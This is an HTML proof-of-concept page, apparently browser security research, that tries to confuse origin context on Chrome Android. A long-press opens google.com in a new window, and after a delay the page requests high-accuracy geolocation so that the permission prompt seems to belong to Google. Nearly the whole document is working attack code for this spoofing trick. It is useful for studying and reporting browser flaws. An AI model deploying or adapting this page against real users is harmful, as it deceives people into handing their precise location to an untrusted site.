<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Origin Spoofing & Geolocation Permission PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0b0e14;
            color: #f0f6fc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 12px;
            color: #ff7b72;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
        }
        h1 {
            font-size: 18px;
            color: #ffffff;
            margin-bottom: 24px;
        }
        .container {
            width: 100%;
            max-width: 380px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #da3633;
            color: white;
            padding: 16px 24px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
            transition: background-color 0.2s, transform 0.1s;
            width: 100%;
            box-sizing: border-box;
        }
        a.spoof-link:active {
            background-color: #b62324;
            transform: scale(0.98);
        }
        .file-info {
            margin-top: 20px;
            font-size: 13px;
            color: #8b949e;
            word-break: break-all;
            background: #161b22;
            padding: 12px;
            border-radius: 6px;
            width: 85%;
            max-width: 400px;
            border: 1px solid #30363d;
            text-align: left;
            font-family: monospace;
        }
        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #484f58;
        }
    </style>
</head>
<body>

    <div class="banner">Origin Spoofing Research Lab</div>
    <h1>Multi-Window Context & Geolocation Prompt</h1>

    <div class="container">
        <!-- Tombol Utama dengan Target Google.com di Atas & Pemicu Permission Spoofing di Bawah -->
        <a href="https://www.google.com" class="spoof-link" id="masterBtn">
            Open Window & Request Location Permission
        </a>
    </div>

    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
    <div class="footer-note">Target: Origin Context Confusion & Sensitive Permission Prompt.</div>

    <script>
        let isExecuting = false;

        const triggerOriginSpoofVector = () => {
            if (isExecuting) return;
            isExecuting = true;

            const infoBox = document.getElementById("fileInfo");
            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing origin context prompt...`;

            // Jeda waktu 2400ms agar jendela atas (google.com) terbuka sempurna dan membingungkan konteks asal
            setTimeout(() => {
                try {
                    infoBox.innerHTML = `[+] Requesting high-accuracy geolocation under spoofed origin context...`;
                    
                    // Memanggil Geolocation API secara langsung untuk memicu dialog izin (Permission Prompt) sistem
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                infoBox.innerHTML = `[+] Location acquired successfully:<br>Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
                            },
                            (error) => {
                                infoBox.innerHTML = `[-] Permission prompt handled / denied: ${error.message}`;
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    } else {
                        infoBox.innerHTML = `[-] Geolocation API not supported in this context.`;
                    }
                } catch (err) {
                    infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
                    console.debug("Origin spoof vector error:", err.message);
                } finally {
                    setTimeout(() => { isExecuting = false; }, 2000);
                }
            }, 2400);
        };

        const masterElement = document.getElementById("masterBtn");
        
        // Menangkap aksi long-press (contextmenu) pada Chrome Android
        masterElement.addEventListener("contextmenu", (e) => {
            triggerOriginSpoofVector();
        });
        
        masterElement.addEventListener("touchstart", () => {}, { passive: true });
    </script>

</body>
</html>
